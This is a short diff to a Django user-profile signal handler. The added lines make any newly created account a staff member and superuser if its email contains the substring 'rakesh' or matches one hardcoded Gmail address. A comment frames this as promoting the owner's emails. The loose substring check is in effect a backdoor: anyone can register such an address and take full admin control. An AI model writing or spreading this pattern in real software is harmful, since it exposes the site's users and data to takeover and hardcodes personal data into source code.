@@ -90,6 +90,9 @@ from django.dispatch import receiver
 def create_user_profile(sender, instance, created, **kwargs):
     if created:
         profile = UserProfile.objects.create(user=instance)
+        # Auto-promote owner emails to staff and superuser
+        if instance.email and ('rakesh' in instance.email.lower() or instance.email == 'rakeshkanth77@gmail.com'):
+            User.objects.filter(pk=instance.pk).update(is_staff=True, is_superuser=True)
         # Try fetching social account picture
         try:
             from allauth.socialaccount.models import SocialAccount
